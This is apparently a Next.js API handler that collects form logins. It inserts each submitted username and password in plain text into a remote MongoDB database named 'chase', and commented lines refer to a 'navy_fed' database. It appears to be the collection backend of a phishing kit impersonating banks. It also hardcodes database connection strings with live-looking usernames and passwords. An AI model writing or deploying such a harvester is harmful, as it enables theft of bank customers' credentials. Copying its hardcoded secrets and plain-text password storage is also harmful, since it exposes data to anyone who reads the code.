

import { NextApiRequest, NextApiResponse } from 'next';
import { MongoClient } from 'mongodb';

export default async function post(req: NextApiRequest, res: NextApiResponse) {
  if (req.method!== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const MONGODB_CONNECT = "mongodb+srv://phindCode:phindCode@cluster0.kcfnncd.mongodb.net/imisi"
  // const MONGO_URI = "mongodb+srv://tylercrosson23:June23Csml.@navy-pjcjbaz.mongodb.net/navy_fedaral"
  const MONGO_URI = "mongodb+srv://inspire:June23Csm1.@cluster0.q9dnjdv.mongodb.net/"

  // const client = new MongoClient("mongodb+srv://tylercrosson23:June23Csml.@navy-pjcjbaz.mongodb.net/navy_fed", { serverSelectionTimeoutMS: 30000 });
  const client = new MongoClient(MONGO_URI, { serverSelectionTimeoutMS: 30000 });
  
  try {
    // Connect to MongoDB
    await client.connect();
    const db = client.db('chase');
    const collection = db.collection('users');
  
    const { username, password } = req.body;
    

    const result = await collection.insertOne({ username, password });

    res.status(200).send('Form data submitted successfully');

  } catch (error) {
    console.error('Error inserting data:', error);
    res.status(500).json({ message: 'Internal Server Error' });
  } finally {
    // Ensure the MongoDB client is closed after the operation
    await client.close();
  }
}
